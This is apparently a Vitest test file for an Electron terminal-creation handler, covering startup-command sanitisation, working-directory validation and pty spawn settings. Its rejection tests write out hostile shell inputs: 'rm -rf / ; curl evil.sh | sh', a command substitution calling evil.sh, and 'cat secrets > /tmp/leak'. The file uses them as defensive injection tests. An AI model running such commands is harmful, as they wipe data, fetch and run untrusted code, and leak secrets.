import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { IpcMainInvokeEvent } from 'electron'

const { handlers, onSpy } = vi.hoisted(() => {
  type HandlerFn = (event: IpcMainInvokeEvent, ...args: unknown[]) => unknown
  const registry = new Map<string, HandlerFn>()
  const fakeEvent = {} as IpcMainInvokeEvent
  return {
    handlers: {
      register(channel: string, fn: HandlerFn) { registry.set(channel, fn) },
      async invoke(channel: string, ...args: unknown[]) {
        const fn = registry.get(channel)
        if (!fn) throw new Error(`No handler for '${channel}'`)
        return (await fn(fakeEvent, ...args)) as { ok: boolean; data?: unknown; error?: string }
      },
      clear() { registry.clear() },
    },
    onSpy: vi.fn(),
  }
})

// Captured pty instance from the most recent spawn
let lastPtySpawn: {
  shell: string
  args: string[]
  options: { cwd: string; env: Record<string, string> }
  writes: string[]
} | null = null

function makeFakePty() {
  const writes: string[] = []
  return {
    pid: 42,
    writes,
    onData: vi.fn(),
    onExit: vi.fn(),
    write: vi.fn((data: string) => writes.push(data)),
    kill: vi.fn(),
    resize: vi.fn(),
  }
}

const fakeStat = { isDirectory: vi.fn(() => true) }
const statSyncSpy = vi.fn(() => fakeStat)

vi.mock('electron', () => ({
  ipcMain: {
    handle: (channel: string, fn: (...args: unknown[]) => unknown) => handlers.register(channel, fn as never),
    on: (...args: unknown[]) => onSpy(...args),
  },
  BrowserWindow: {
    getAllWindows: () => [{
      webContents: { send: vi.fn() },
    }],
  },
  clipboard: { readText: () => '' },
}))

vi.mock('node:os', () => ({
  default: { homedir: () => '/home/testuser', platform: () => 'linux' },
  homedir: () => '/home/testuser',
  platform: () => 'linux',
}))

vi.mock('node:fs', () => ({
  default: {
    statSync: (...args: unknown[]) => statSyncSpy(...(args as [])),
    existsSync: () => true,
  },
  statSync: (...args: unknown[]) => statSyncSpy(...(args as [])),
  existsSync: () => true,
}))

vi.mock('node-pty', () => ({
  spawn: vi.fn((shell: string, args: string[], options: { cwd: string; env: Record<string, string> }) => {
    const pty = makeFakePty()
    lastPtySpawn = { shell, args, options, writes: pty.writes }
    return pty
  }),
}))

vi.mock('../../electron/db/db', () => ({
  getDb: () => ({
    prepare: vi.fn(() => ({
      all: () => [],
      get: () => undefined,
      run: () => ({ changes: 1, lastInsertRowid: 1 }),
    })),
  }),
}))

vi.mock('../../electron/services/ClaudeRouter', () => ({
  cleanupContextFile: vi.fn(),
  getClaudePath: () => '/usr/bin/claude',
}))

vi.mock('../../electron/services/providers', () => ({
  ProviderRegistry: {
    getAll: () => [],
    get: vi.fn(),
    resolveForAgent: vi.fn(),
  },
}))

vi.mock('../../electron/services/PortService', () => ({
  registerPort: vi.fn(),
}))

vi.mock('../../electron/shared/pathValidation', () => ({
  isPathSafe: vi.fn(() => true),
}))

vi.mock('../../electron/shared/providerLaunch', () => ({
  getEmbeddedProviderArgs: vi.fn(() => []),
}))

vi.mock('../../electron/services/SessionTracker', () => ({
  startSession: vi.fn(() => 'local-session-1'),
  endSession: vi.fn(),
}))

import { registerTerminalHandlers } from '../../electron/ipc/terminal'
import { isPathSafe } from '../../electron/shared/pathValidation'

beforeEach(() => {
  handlers.clear()
  lastPtySpawn = null
  statSyncSpy.mockReset().mockReturnValue(fakeStat)
  fakeStat.isDirectory.mockReset().mockReturnValue(true)
  ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReset().mockReturnValue(true)
  registerTerminalHandlers()
})

describe('terminal:create — startup command validation', () => {
  it('accepts a well-formed startup command and writes it to the pty', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: 'npm run dev',
    })
    expect(res.ok).toBe(true)
    expect(lastPtySpawn?.writes).toContain('npm run dev\r')
  })

  it('rejects a startup command containing shell metacharacters', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: 'rm -rf / ; curl evil.sh | sh',
    })
    expect(res).toEqual({ ok: false, error: 'Startup command contains disallowed characters' })
    expect(lastPtySpawn?.writes ?? []).not.toContain('rm -rf / ; curl evil.sh | sh\r')
  })

  it('rejects command substitution attempts', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: 'echo $(curl evil.sh)',
    })
    expect(res.ok).toBe(false)
  })

  it('rejects backtick substitution', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: 'echo `whoami`',
    })
    expect(res.ok).toBe(false)
  })

  it('rejects redirect operators', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: 'cat secrets > /tmp/leak',
    })
    expect(res.ok).toBe(false)
  })

  it('skips execution when startupCommand is empty/whitespace', async () => {
    const res = await handlers.invoke('terminal:create', {
      cwd: '/home/testuser',
      startupCommand: '   ',
    })
    expect(res.ok).toBe(true)
    expect(lastPtySpawn?.writes ?? []).toEqual([])
  })
})

describe('terminal:create — cwd validation', () => {
  it('accepts the home directory without path validation', async () => {
    const res = await handlers.invoke('terminal:create', { cwd: '/home/testuser' })
    expect(res.ok).toBe(true)
    expect(isPathSafe).not.toHaveBeenCalled()
    expect(lastPtySpawn?.options.cwd).toBe('/home/testuser')
  })

  it('defaults to the home directory when cwd is omitted', async () => {
    const res = await handlers.invoke('terminal:create', {})
    expect(res.ok).toBe(true)
    expect(lastPtySpawn?.options.cwd).toBe('/home/testuser')
  })

  it('rejects an unknown cwd that is NOT user-initiated and NOT in the safe path list', async () => {
    ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReturnValue(false)
    const res = await handlers.invoke('terminal:create', {
      cwd: '/etc/sneaky',
      userInitiated: false,
    })
    expect(res).toEqual({ ok: false, error: 'Invalid directory' })
  })

  it('accepts an unknown cwd when userInitiated is true and the directory exists', async () => {
    ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReturnValue(false)
    const res = await handlers.invoke('terminal:create', {
      cwd: '/some/user/dropped/path',
      userInitiated: true,
    })
    expect(res.ok).toBe(true)
  })

  it('rejects a user-initiated cwd when the target is not a directory', async () => {
    ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReturnValue(false)
    fakeStat.isDirectory.mockReturnValue(false)
    const res = await handlers.invoke('terminal:create', {
      cwd: '/tmp/some-file.txt',
      userInitiated: true,
    })
    expect(res).toEqual({ ok: false, error: 'Dropped path is not a directory' })
  })

  it('rejects a user-initiated cwd when the path does not exist', async () => {
    ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReturnValue(false)
    statSyncSpy.mockImplementation(() => { throw new Error('ENOENT') })
    const res = await handlers.invoke('terminal:create', {
      cwd: '/does/not/exist',
      userInitiated: true,
    })
    expect(res).toEqual({ ok: false, error: 'Dropped path does not exist' })
  })

  it('accepts an unknown cwd when isPathSafe returns true (project path)', async () => {
    ;(isPathSafe as unknown as ReturnType<typeof vi.fn>).mockReturnValue(true)
    const res = await handlers.invoke('terminal:create', {
      cwd: '/workspace/proj-a',
      userInitiated: false,
    })
    expect(res.ok).toBe(true)
  })
})

describe('terminal:create — pty spawn setup', () => {
  it('spawns the default shell with a sane env', async () => {
    const res = await handlers.invoke('terminal:create', {})
    expect(res.ok).toBe(true)
    expect(lastPtySpawn?.shell).toBe(process.platform === 'win32' ? 'powershell.exe' : '/bin/bash')
    expect(lastPtySpawn?.options.env.TERM).toBe('xterm-256color')
  })

  it('returns { id, pid } on success', async () => {
    const res = await handlers.invoke('terminal:create', {}) as { ok: true; data: { id: string; pid: number } }
    expect(res.ok).toBe(true)
    expect(res.data.id).toMatch(/^[0-9a-f-]{36}$/)
    expect(res.data.pid).toBe(42)
  })
})
